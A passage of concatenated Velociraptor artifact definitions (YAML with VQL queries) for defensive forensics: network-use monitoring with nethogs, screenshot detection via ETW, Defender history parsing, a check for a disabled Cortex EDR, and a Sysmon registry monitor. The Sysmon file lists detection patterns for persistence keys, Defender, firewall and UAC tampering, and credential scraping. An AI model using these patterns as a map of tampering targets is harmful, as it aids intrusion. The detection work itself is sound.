       LET EachIOC = SELECT * from foreach(
         row=Data,
         query={
            SELECT _value.ioc_value AS IOCValue,
              _value.ioc_description AS Description,
              _value.tlp_name AS TLP,
              _value.link AS `Linked Cases`,
              _value AS _Content
            FROM items(item=IOCs)
       })
       
       SELECT * FROM EachIOC WHERE IOCValue =~ IOC


---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Network.Nethogs.yaml
======
name: Linux.Network.Nethogs
author: 'Andreas Misje - @misje'
description: |
  Monitor network use per process using the tool "nethogs". This artifact will
  list all processes that produces (non-local) network traffic on the client.
  The NetstatEnriched artifact is used to provide detailed information about the
  process using netstat and the process tracker, along with the bytes received
  and sent in bytes per second.

  Note that the tool/package "nethogs" needs to be installed before calling this
  artifact. Set the parameter InstallNethogs to true in order to automatically
  install the package and its dependencies (Debian-based systems only).

  Using techniques like stacking, rare occurances of processes contacting the
  Internet can be spotted. Notebook suggestions give you total traffic overview,
  as well as boilerplate code to plot the traffic for a selected process.

  Also see Linux.Event.Network.Nethogs for a nethogs event artifact.

parameters:
  - name: InstallNethogs
    description: Install nethogs using apt-get
    type: bool
    default: false

  - name: Duration
    type: int
    description: Number of seconds to monitor processes
    default: 300

  - name: NetstatCachePeriod
    description: Number of seconds to cache netstat data
    type: int
    default: 10

  - name: ProcessRegex
    description: |
      Only look for processes whose name / command line matches this regex
    type: regex
    default: .+

  - name: PIDRegex
    description: |
      Only look for processes whose PID matches this regex
    type: regex
    default: .+

  - name: UIDRegex
    description: |
      Only look for processes whose owner ID (UID) matches this regex
    type: regex
    default: .+

precondition:
  SELECT * FROM info() where OS = 'linux'

sources:
    - query: |
         LET Hoggers = SELECT Timestamp,
                              Process,
                              int(int=PID) AS PID,
                              UID,
                              parse_float(string=Sent) AS Sent,
                              parse_float(string=Recv) AS Recv
           FROM query(
             timeout=Duration,
             inherit=true,
             query={
               SELECT *
               FROM foreach(
                 row={
                   SELECT *
                   FROM execve(argv=['/usr/sbin/nethogs', '-t', '-C'],
                               length=10000,
                               sep='\n\nRefreshing:\n')
                 },
                 query={
                   SELECT timestamp(epoch=now()) AS Timestamp,
                          *
                   FROM parse_records_with_regex(
                     accessor='data',
                     file=Stdout,
                     regex='''^\s*(?P<Process>[^\t]+)/(?P<PID>\d+)/(?P<UID>\d+)\t(?P<Sent>[^\t]+)\t(?P<Recv>\S+)''')
                   WHERE Process =~ ProcessRegex
                    AND PID =~ PIDRegex
                         AND UID =~ UIDRegex
                 })
             })

         LET Netstat <= memoize(
             name='netstat',
             key='Pid',
             period=NetstatCachePeriod,
             query={
               SELECT *
               FROM Artifact.Linux.Network.NetstatEnriched()
             })

         LET Result = SELECT *
           FROM foreach(
             row={
               SELECT *
               FROM Hoggers
             },
             query={
               SELECT *
               FROM foreach(
                 row={
                   SELECT 
                          dict(
                            Timestamp=Timestamp,
                            Process=Process,
                            PID=PID,
                            UID=UID,
                            Sent=Sent,
                            Recv=Recv,
                            ProcInfo=dict(
                              CommandLine=NULL,
                              Username=NULL,
                              StartTime=NULL)) + (get(
                              item=Netstat,
                              field=PID) || dict(
                              Name=NULL,
                              Laddr=NULL,
                              Lport=NULL,
                              Raddr=NULL,
                              Rport=NULL,
                              Status=NULL,
                              ProcInfo=dict(),
                              CallChain=NULL,
                              ChildrenTree=NULL)) AS Contents
                   FROM scope()
                   WHERE Contents
                 },
                 column='Contents')
             })

         // Leverage the InstallDeb utility to do the actual package install:
         LET InstallDeps = SELECT *
           FROM if(
             condition=InstallNethogs,
             then={
               SELECT *
               FROM Artifact.Linux.Utils.InstallDeb(DebName='nethogs')
             })

         SELECT *
         FROM chain(a_install=InstallDeps,
                    b_result=Result)

      notebook:
        - type: vql
          name: Traffic
          template: |
            /*
            # Network traffic

            {{ $TimeRange := Query "SELECT min(item=Timestamp) AS StartTime, max(item=Timestamp) AS EndTime FROM source() GROUP BY 1" | Expand }}
            Network traffic (in bytes per second) between {{ Get $TimeRange "0.StartTime" }}
            and {{ Get $TimeRange "0.EndTime" }}
            */
            LET ColumnTypes = dict(
                _ChildrenTree='tree')

            SELECT 
                   Timestamp,
                   PID,
                   ProcInfo.Name || Process AS Name,
                   ProcInfo.CommandLine AS CmdLine,
                   ProcInfo.Username AS Username,
                   ProcInfo.StartTime AS StartTime,
                   Laddr,
                   Lport,
                   Raddr,
                   Rport,
                   Status,
                   humanize(
                     bytes=Sent * 1024) AS Sent,
                   humanize(
                     bytes=Recv * 1024) AS Recv,
                   ProcInfo AS _ProcInfo,
                   CallChain AS _CalLChain,
                   ChildrenTree AS _ChildrenTree
            FROM source()
            LIMIT 50

        - type: vql_suggestion
          name: Total traffic
          template: |
            /*
            # Network traffic summary

            {{ $TimeRange := Query "SELECT min(item=Timestamp) AS StartTime, max(item=Timestamp) AS EndTime FROM source() GROUP BY 1" | Expand }}
            This is a **rough estimate** of the total bytes sent and received between
            {{ Get $TimeRange "0.StartTime" }} and {{ Get $TimeRange "0.EndTime" }}.
            */
            LET Summary = SELECT 
                     PID,
                     ProcInfo.Name || Process AS Name,
                     ProcInfo.CommandLine AS CommandLine,
                     ProcInfo.Username AS Username,
                     ProcInfo.StartTime AS StartTime,
                     // nethogs -t outputs a data rate every second. Adding these
                     // values give us a rough estimate of the data transferred
                     sum(
                       item=Sent * 1024) AS Sent,
                     sum(
                       item=Recv * 1024) AS Recv
              FROM source()
              GROUP BY PID, Name

            SELECT *,
                   humanize(
                     bytes=Sent) AS Sent,
                   humanize(
                     bytes=Recv) AS Recv,
                   humanize(
                     bytes=Recv + Sent) AS Total
            FROM Summary
            LIMIT 50

        - type: vql_suggestion
          name: Plot traffic for PID
          template: |
            // The process whose traffic to plot:
            LET PIDTarget = 1234

            /*
            {{ $Vars := Query "SELECT PIDTarget, min(item=Timestamp) AS StartTime, max(item=Timestamp) AS EndTime FROM source() GROUP BY 1" | Expand }}
            # Network traffic for PID {{ Get $Vars "0.PIDTarget" }}

            Network traffic (in bytes per second) between {{ Get $Vars "0.StartTime" }}
            and {{ Get $Vars "0.EndTime" }}
            */
            LET SinglePSStats = SELECT 
                                       Timestamp.Unix AS Timestamp,
                                       Sent * 1024 AS Sent,
                                       Recv * 1024 AS Recv
              FROM source()
              WHERE PID = PIDTarget
              LIMIT 50

            /*
            {{ Query "SELECT * FROM SinglePSStats" | TimeChart }}
            */

            // We do not really need this, but we need to execute some VQL
            // in order for the plot to appear:
            SELECT *
            FROM SinglePSStats
---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.ETW.ScreenshotTaken.yaml
======
name: Windows.ETW.ScreenshotTaken
author: Zane Gittins
description: |
   This artifact detects screen captures by correlating events from the Microsoft-Windows-Win32k ETW provider which are triggered by common Windows API calls made when taking a screenshot. This can be useful for detecting remote access trojans, infostealers, and data exfiltration. Tested against Sliver, Meterpreter, and Empire. This will also trigger on legitimate tools such as ZoomIt, Greenshot, MsTeams, etc. which can be excluded on a case by case basis via the ProcessExceptionsRegex parameter.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT or NOTEBOOK
type: CLIENT_EVENT

parameters:
  - name: ProcessExceptionsRegex
    description: Except these processes.
    type: string
    default: "Explorer.exe"
  - name: ScreenshotMaxRows
    description: Maximum number of screenshot events to store in internal fifo queue for correlation.
    type: int
    default: 500
  - name: ScreenshotMaxAge
    description: Maximum age in seconds to retain screenshot events to store in internal fifo queue for correlation.
    type: int
    default: 90
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' AND version(plugin="dedup") >= 0

    query: |
       // WindowUpdate(1) - Triggered by BitBlt() we delay this by 5 seconds due to a race condition in correlating with screenshot events.
       LET WindowUpdateEvents = SELECT
           *
         FROM delay(
           query={
           SELECT
           *
           FROM dedup(
             query={
             SELECT
             *, System.ProcessID AS FirstPid
             FROM watch_etw(
               guid="{8c416c79-d49b-4f01-a467-e56d3aa8234c}",
               level=4,
               any=5120,
               description="Microsoft-Windows-Win32k")
             WHERE System.ID = 1
               AND EventData.Hwnd = "0x0"
                 AND (EventData.Type = "2147483654" OR EventData.Type = "2147483655")
         },
             timeout=5,
             key="FirstPid")
         },
           delay=5)
       
       // GdiSysMemToken(33) - Created by EtwGdiSysMemToken() in win32kbase.sys
       // PhysicalSurfCreate(52) - This is triggered by CreateCompatibleBitmap. Created by EtwPhysicalSurfCreateEvent() in win32kbase.sys
       LET ScreenshotEvents = SELECT
           *
         FROM dedup(
           query={
           SELECT
           *, System.ProcessID AS Pid
           FROM watch_etw(
             guid="{8c416c79-d49b-4f01-a467-e56d3aa8234c}",
             level=4,
             any=5120,
             description="Microsoft-Windows-Win32k")
           WHERE System.ID = 33 OR System.ID = 52
         },
           timeout=5,
           key="Pid")
       
       LET LastEvents = SELECT *, System.ProcessID AS ScreenshotPid
         FROM fifo(query=ScreenshotEvents,
                   max_rows=ScreenshotMaxRows,
                   max_age=ScreenshotMaxAge)
       
       LET Track = SELECT *
         FROM foreach(row=WindowUpdateEvents,
                      query={
           SELECT *, process_tracker_get(id=System.ProcessID).Data AS ProcInfo,
                  count(items=Pid) AS Count
           FROM LastEvents
           WHERE ScreenshotPid = FirstPid
           GROUP BY Pid
         })
         WHERE Count >= 1
       
       SELECT timestamp(string=System.TimeStamp) AS Timestamp,
              ProcInfo,
              ScreenshotPid AS Pid,
              Count
       FROM Track
       WHERE NOT ProcInfo.Exe =~ ProcessExceptionsRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.DefenderHistory.yaml
======
name: Windows.Applications.DefenderHistory
author: "Roman Makuch - @rmakuch Kanstantsin Ilioukevitch - @kostyailiouk"
description:  |
    This artifact parses the Windows Defender files generated on threat detection and returns
    the contained parameters created by Windows Defender about the detected threat. 

    By default with no parameters DefenderHistory parses 
    "C:/ProgramData/Microsoft/Windows Defender/Scans/History/Service/DetectionHistory/**"
    A different TargetGlob can be entered.

    Based on the research work done by Jordan Klepser @JordanKlepser
    https://github.com/jklepsercyber/defender-detectionhistory-parser 

reference:
  - https://github.com/jklepsercyber/defender-detectionhistory-parser

parameters: 
  - name: TargetGlob
    description: Glob to target.
    default: C:/ProgramData/Microsoft/Windows Defender/Scans/History/Service/DetectionHistory/**

sources:
  - query: |
        Let profile = '''
          [
            ["Info", 0, [
                ["__FileHeaderSearch", 0, "String", {"length": 6, "term":""}],
                ["__FileHeader", 0, "Value", {"value":"x=>format(format='%#x', args=x.__FileHeaderSearch)"}],
                ["__GUID", 24, "GUIDStruct"],
                ["__MagicVersion", 48, "String", {"length": 38, "encoding":"utf16"}],
                ["__ThreatTypeLength", 88, "uint8"],
                ["ThreatType", 96, "String", {"length":"x=> x.__ThreatTypeLength - 2", "encoding":"utf16"}],
                ["ThreatStatusID", 240, "Enumeration", {
                    type: "uint8",
                    map: {
                         "Unknown": 0,
                         "Detected": 1,
                         "Cleaned": 2,
                         "Quarantined": 3,
                         "Removed": 4,
                         "Allowed": 5,
                         "Blocked": 6,
                         "Clean Failed": 7,
                         "Quarantine Failed": 102,
                         "Remove Failed": 103,
                         "Allow Failed": 104,
                         "Abandoned": 105,
                         "Blocked Failed": 107,
                     }}],
                ["__Search", 241, "String", {"length": 1024, "term_hex":"0A00000015"}],
                ["SourceType", "x => len(list=x.__Search) + 249", "String", {"encoding": "utf16"}],
                ["__FullPathLength", "x => len(list=x.__Search) + 265", "uint8"],
                ["FullPath", "x => len(list=x.__Search) + 273", "String", {"length":"x=> x.__FullPathLength - 2", "encoding":"utf16"}],
                ["__Sha256Search", 300, "String", {"length": 1024, "term_hex":"53006800610032"}],
                ["Sha256", "x => len(list=x.__Sha256Search) + 322", "String", {"length": 128, "encoding":"utf16"}],
                ["__TimeSearch", 300, "String", {"length": 1024, "term_hex":"540069006D0065"}],
                ["Time", "x => len(list=x.__TimeSearch) + 314", "WinFileTime"],
                ["__FileSizeSearch", 300, "String", {"length": 4000, "max_length": 4000, "term_hex":"530069007A0065"}],
                ["ThreatFileSize", "x => len(list=x.__FileSizeSearch) +  314", "uint32"],
                ["__UserSearch", "x=> if(condition=Size > 1024, then=(Size - 1024), else=0)", "String", {"length": 1024, "term_hex":"0000080000000A0000"}],
                ["__Section3Offset", 0, "Value", {"value": "x => if(condition=Size > 1024, then=len(list=x.__UserSearch) + (Size - 1024), else=len(list=x.__UserSearch)) + 114" }],
                ["User", "x => x.__Section3Offset", "String", {"encoding": "utf16"}],
                ["__SearchStartingProcess", "x=> x.__Section3Offset + len(list=x.User)", "String", {"length": 1024, "term_hex": "0000150000"}],
                ["StartingProcess", "x=> x.__Section3Offset + len(list=x.User) + len(list=x.__SearchStartingProcess) + 6", "String", {"encoding": "utf16"}]
            ]],
            ["GUIDStruct", 16, [
              ["__D1", 0, "uint32"],
              ["__D2", 4, "uint16"],
              ["__D3", 6, "uint16"],
              ["__D4", 8, "String", {"term": "", "length": 2}],
              ["__D5", 10, "String", {"term": "", "length": 6}],
              ["DetectionID", 0, "Value", {"value": "x=>format(format='{%x-%x-%x-%x-%x}', args=[x.__D1, x.__D2, x.__D3, x.__D4, x.__D5])"}]
             ]],
          ]
          '''
    
            Let temp = SELECT FullPath, 
                  Size,    
                  parse_binary(filename=FullPath, profile = profile, struct = 'Info') as parsedfile 
            FROM glob(globs = TargetGlob)
            Where IsDir = False
            
            SELECT  parsedfile.Time as EventTime,
                    parsedfile.ThreatType as ThreatType,
                    parsedfile.ThreatStatusID as ThreatStatus,
                    parsedfile.FullPath as FullPath,
                    parsedfile.Sha256 as Sha256,
                    parsedfile.SourceType as SourceType,
                    parsedfile.ThreatFileSize as FileSizeBytes,
                    parsedfile.User as User,
                    parsedfile.StartingProcess as StartingProcess,
                    FullPath as ParsedFileFullPath
            FROM temp

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.DisabledCortexXDR.yaml
======
name: Windows.Registry.CortexEDRDisabled
author: Rhys Jenkins @Rhysistance
description: |
    This artifact will attempt to identify Cortex EDR that has been disabled via regkey
reference:
  - https://mrd0x.com/cortex-xdr-analysis-and-bypass/

parameters:
 - name: KeyGlob
   default: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters\ServiceDll

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT Name,Data.value as DllName,Fqdn FROM glob(globs=KeyGlob, accessor="reg") WHERE NOT DllName =~ "cryptsvc\.dll"

---END OF FILE---

======
FILE: /content/exchange/artifacts/OfficeServerCache.yaml
======
name: Windows.Applications.OfficeServerCache

description: |
  Return Office Internet Server Cache Registry keys and values in
  order to identify possible C2 URLs from malicious opened Office
  documents.

  Such keys should be written by exploits such as CVE-2021-40444
  (Microsoft MSHTML Remote Code Execution Vulnerability)

author: Eduardo Mattos - @eduardfir

reference:
  - https://twitter.com/RonnyTNL/status/1435918945349931008/photo/1

type: CLIENT

parameters:
  - name: OfficeServerCacheKey
    default: SOFTWARE\Microsoft\Office\*\Common\Internet\Server Cache\**
  - name: UserNameRegex
    default: .
    description: Filter by this UserName regex.
  - name: TargetRegex
    default: "http|https|ftp|smb|webdav|\\\\|//|:"
    description: Target server regex filter. Default should return all protocols.
  - name: TargetWhitelist
    description: Target whitelist regex.

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
    query: |
        LET UserList <= SELECT Name as UserName, User_sid as SID FROM users()
                      WHERE Name =~ UserNameRegex

        SELECT * FROM foreach(
            row={
                SELECT * FROM UserList
            },
            query={
                SELECT
                    ModTime as Modified,
                    UserName,
                    Name,
                    FullPath
                FROM glob(globs="HKEY_USERS\\" + SID + "\\" + OfficeServerCacheKey, accessor="registry")
                WHERE Name =~ TargetRegex
                    AND NOT if(condition=TargetWhitelist,
                                then= Name=~TargetWhitelist,
                                else= False)
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/SysmonRegistry.yaml
======
name: Windows.Events.SysmonRegistry
author: Matt Green - @mgreen27
description: |
  This artifact enables monitoring for registry events of interest via the Sysmon 
  ETW proiver.
  
  The artifact requires Sysmon installed collecting registry events 12,13 and 14.  
  It is also reccomended to run Windows.Events.TrackProcesses as this also 
  includes a base level Sysmon install.
  
  Monitoring is configured by a csv KeyRegex which has the following fields:  
    * Regex - a regex to select registry key events of interest.  
    * FilterRegex - a regex to filter out keys.  
    * FilterProcess - a regex to filter out Image field - 
    e.g ```C:\\Windows\\regedit\.exe$```.  
    * Details - a description of the Detection.   
    * ATT&CK - a MITRE ATT&CK reference.  
    
  Note: This artifact may be impacted by your Sysmon configuration. 
  Generally it is more efficient to filter at the kernel level via Sysmon 
  configurtion.
  
type: CLIENT_EVENT

parameters:
  - name: KeyRegex
    type: csv
    default: |
        Regex,FilterRegex,FilterProcess,Details,ATT&CK
        CurrentVersion\\Run,,,"Windows: Wildcard for Run keys, including RunOnce, RunOnceEx, RunServices, RunServicesOnce [Also covers terminal server] ",T1060
        Policies\\Explorer\\Run,,,Windows: Alternate runs keys | Credit @ion-storm,T1060
        Group Policy\\Scripts,,,Windows: Group policy scripts,T1484
        Windows\\System\\Scripts,,,"Windows: Wildcard for Logon, Loggoff, Shutdown",T1484
        CurrentVersion\\Windows\\Load,,,Windows: [ https://msdn.microsoft.com/en-us/library/jj874148.aspx ],T1060
        CurrentVersion\\Windows\\Run,,,Windows: [ https://msdn.microsoft.com/en-us/library/jj874148.aspx ],T1060
        CurrentVersion\\Winlogon\\Shell,,,Windows: [ https://msdn.microsoft.com/en-us/library/ms838576(v=winembedded.5).aspx ],T1060
        CurrentVersion\\Winlogon\\System,,,Windows [ https://www.exterminate-it.com/malpedia/regvals/zlob-dns-changer/118 ],T1060
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify,,,Windows: Autorun location [ https://attack.mitre.org/wiki/Technique/T1004 ] [ https://www.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order ],
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell,,,Windows: [ https://technet.microsoft.com/en-us/library/ee851671.aspx ],
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit,,,Windows: Autorun location [ https://www.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order ],
        ^HKLM\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32,,,Windows: Legacy driver loading | Credit @ion-storm ,
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute,,,Windows: Autorun | Credit @ion-storm | [ https://www.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order ],
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug,,,Windows: Automatic program crash debug program [ https://www.symantec.com/security_response/writeup.jsp?docid=2007-050712-5453-99&tabid=2 ],
        UserInitMprLogonScript,,,Windows: Legacy logon script environment variable [ http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/ ],
        user shell folders\\startup$,,,Monitor changes to Startup folder location for monitoring evasion | Credit @SBousseaden,T1112
        \\ServiceDll$,,,Windows: Points to a service's DLL [ https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services ],T1031|T1050
        \\ServiceManifest$,,,Windows: Manifest pointing to service's DLL [ https://www.geoffchappell.com/studies/windows/win32/services/svchost/index.htm ],T1031|T1050
        \\ImagePath$,,,Windows: Points to a service's EXE [ https://attack.mitre.org/wiki/Technique/T1050 ],T1031|T1050
        \\Start$,,,"Windows: Services start mode changes (Disabled, Automatically, Manual)",T1031|T1050
        Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber$,,,Windows: RDP port change under Control [ https://blog.menasec.net/2019/02/of-rdp-hijacking-part1-remote-desktop.html ],
        Control\\Terminal Server\\fSingleSessionPerUser$,,,"Windows: Allow same user to have mutliple RDP sessions, to hide from admin being impersonated",
        fDenyTSConnections$,,,Windows: Attacker turning on RDP,
        LastLoggedOnUser$,,,Windows: Changing last-logged in user,
        RDP-tcp\\PortNumber$,,,Windows: Changing RDP port to evade IDS,
        Services\\PortProxy\\v4tov4$,,,Windows: Changing RDP port to evade IDS,
        \\command\\,,,Windows: Sensitive sub-key under file associations and CLSID that map to launch command,T1042
        \\ddeexec\\,,,Windows: Sensitive sub-key under file associations and CLSID that map to launch command,T1122
        {86C86720-42A0-1069-A2E8-08002B30309D},,,Windows: Tooltip handler,T1122
        exefile,,,"Windows Executable handler, to log any changes not already monitored",T1042
        \\InprocServer32\\(Default)$,,,Windows:COM Object Hijacking [ https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence ] | Credit @ion-storm,T1122
        \\Hidden$,,,"Windows:Explorer: Some types of malware try to hide their hidden system files from the user, good signal event ",T1158
        \\ShowSuperHidden$,,,"Windows:Explorer: Some types of malware try to hide their hidden system files from the user, good signal event [ Example: https://www.symantec.com/security_response/writeup.jsp?docid=2007-061811-4341-99&tabid=2 ]",T1158
        \\HideFileExt$,,,Windows:Explorer: Some malware hides file extensions to make diagnosis/disinfection more daunting to novice users ,T1158
        Classes\\*\\,,,Windows:Explorer: [ http://www.silentrunners.org/launchpoints.html ] ,
        Classes\\AllFilesystemObjects\\,,,Windows:Explorer: [ http://www.silentrunners.org/launchpoints.html ] ,
        Classes\\Directory\\,,,Windows:Explorer: [ https://stackoverflow.com/questions/1323663/windows-shell-context-menu-option ],
        Classes\\Drive\\,,,Windows:Explorer: [ https://stackoverflow.com/questions/1323663/windows-shell-context-menu-option ],
        Classes\\Folder\\,,,"Windows:Explorer: ContextMenuHandlers, DragDropHandlers, CopyHookHandlers, [ https://stackoverflow.com/questions/1323663/windows-shell-context-menu-option ]",
        Classes\\PROTOCOLS\\,,,Windows:Explorer: Protocol handlers,
        ContextMenuHandlers\\,,,Windows: [ http://oalabs.openanalysis.net/2015/06/04/malware-persistence-hkey_current_user-shell-extension-handlers/ ],
        CurrentVersion\\Shell,,,"Windows: Shell Folders, ShellExecuteHooks, ShellIconOverloadIdentifers, ShellServiceObjects, ShellServiceObjectDelayLoad [ http://oalabs.openanalysis.net/2015/06/04/malware-persistence-hkey_current_user-shell-extension-handlers/ ]",
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks,,,Windows: ShellExecuteHooks,
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellServiceObjectDelayLoad,,,Windows: ShellExecuteHooks,
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellIconOverlayIdentifiers,,,Windows: ShellExecuteHooks,
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\,,,Windows: Credit to @Hexacorn [ http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/ ],
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram,,,Windows:RDP: Note other Terminal Server run keys are handled by another wildcard already,
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions\\,,,Windows: Group Policy internally uses a plug-in architecture that nothing should be modifying,T1484
        ^HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock,,,"Windows: Wildcard, includes Winsock and Winsock2",
        \\ProxyServer$,,,Windows: System and user proxy server,
        ^HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Provider,,,"Wildcard, includes Credential Providers and Credential Provider Filters",
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\,,,[ https://attack.mitre.org/wiki/Technique/T1131 ] [ https://attack.mitre.org/wiki/Technique/T1101 ],T1101
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SecurityProviders,,,Windows: Changes to WDigest-UseLogonCredential for password scraping [ https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/ ],
        ^HKLM\\Software\\Microsoft\\Netsh,,,Windows: Netsh helper DLL [ https://attack.mitre.org/wiki/Technique/T1128 ],
        Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable,,,Windows: Malware often disables a web proxy for 2nd stage downloads,
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\,,,Windows: Order of network providers that are checked to connect to destination [ https://www.malwarearchaeology.com/cheat-sheets ] ,
        \\EnableFirewall$,,,"Windows: Monitor for firewall disablement, all firewall profiles [ https://attack.mitre.org/wiki/Technique/T1089 ]",T1089
        \\DoNotAllowExceptions$,,,"Windows: Monitor for firewall disablement, all firewall profiles [ https://attack.mitre.org/wiki/Technique/T1089 ]",T1089
        ^HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List,,,Windows Firewall authorized applications for all networks| Credit @ion-storm ,
        ^HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\AuthorizedApplications\\List,,,Windows Firewall authorized applications for domain networks ,
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Appinit_Dlls\\,,,Windows: Feature disabled by default [ https://attack.mitre.org/wiki/Technique/T1103 ],T1103
        ^HKLM\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Appinit_Dlls\\,,,Windows: Feature disabled by default [ https://attack.mitre.org/wiki/Technique/T1103 ],T1103
        ^HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\\,,,Windows: Credit to @Hexacorn [ http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/ ] [ https://blog.comodo.com/malware/trojware-win32-trojanspy-volisk-a/ ],
        Microsoft\\Office\\Outlook\\Addins\\,,,"Microsoft:Office: Outlook add-ins, access to sensitive data and often cause issues",T1137
        Office Test\\,,,Microsoft:Office: Persistence method [ http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/ ] | Credit @Hexacorn,T1137
        Security\\Trusted Documents\\TrustRecords,,,"Microsoft:Office: Monitor when ""Enable editing"" or ""Enable macros"" is used | Credit @OutflankNL | [ https://outflank.nl/blog/2018/01/16/hunting-for-evil-detect-macros-being-executed/ ]",
        Internet Explorer\\Toolbar\\,,,Microsoft:InternetExplorer: Machine and user [ Example: https://www.exterminate-it.com/malpedia/remove-mywebsearch ] ,T1176
        Internet Explorer\\Extensions\\,,,Microsoft:InternetExplorer: Machine and user [ Example: https://www.exterminate-it.com/malpedia/remove-mywebsearch ] ,T1176
        Browser Helper Objects\\,,,Microsoft:InternetExplorer: Machine and user [ https://msdn.microsoft.com/en-us/library/bb250436(v=vs.85).aspx ],T1176
        ^HKLM\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\\,,,Windows: Thumbnail cache autostart [ http://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-levels-up-with-new-autostart-mechanism/ ] ,
        ^HKLM\\Software\\Classes\\WOW6432Node\\CLSID\\{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\\,,,Windows: Thumbnail cache autostart [ http://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-levels-up-with-new-autostart-mechanism/ ] ,
        ^HKLM\\Software\\Classes\\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\,,,Windows: DirectX instances,
        ^HKLM\\Software\\Classes\\WOW6432Node\\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\,,,Windows: DirectX instances,
        \\UrlUpdateInfo$,,,Microsoft:ClickOnce: Source URL is stored in this value [ https://subt0x10.blogspot.com/2016/12/mimikatz-delivery-via-clickonce-with.html ],
        \\InstallSource$,,,Windows: Source folder for certain program and component installations,
        \\EulaAccepted$,,,Sysinternals tool launched. Lots of useful abilities for attackers ,
        \\DisableAntiSpyware$,,,Windows:Defender: State modified via registry,T1089|Tamper-Defender
        \\DisableAntiVirus$,,,Windows:Defender: State modified via registry,T1089|Tamper-Defender
        \\SpynetReporting$,,,Windows:Defender: State modified via registry,T1089|Tamper-Defender
        DisableRealtimeMonitoring$,,,Windows:Defender: State modified via registry,T1089|Tamper-Defender
        \\SubmitSamplesConsent$,,,Windows:Defender: State modified via registry,T1089|Tamper-Defender
        HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA$,,,Detect: UAC Tampering | Credit @ion-storm ,T1088
        HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy$,,,Detect: UAC Tampering | Credit @ion-storm ,T1088
        HKLM\\Software\\Microsoft\\Security Center\\$,,,[ https://attack.mitre.org/wiki/Technique/T1089 ],T1089|Tamper-SecCenter
        SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\HideSCAHealth$,,,Windows:Security Center: Malware sometimes disables [ https://blog.avast.com/2013/08/12/your-documents-are-corrupted-from-image-to-an-information-stealing-trojan/ ],T1089|Tamper-SecCenter
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom,,,Windows: AppCompat [ https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html ],T1138
        ^HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB,,,Windows: AppCompat [ https://attack.mitre.org/wiki/Technique/T1138 ],T1138
        VirtualStore,,,"Windows: Registry virtualization, something's wrong if it's in use [ https://msdn.microsoft.com/en-us/library/windows/desktop/aa965884(v=vs.85).aspx ]",
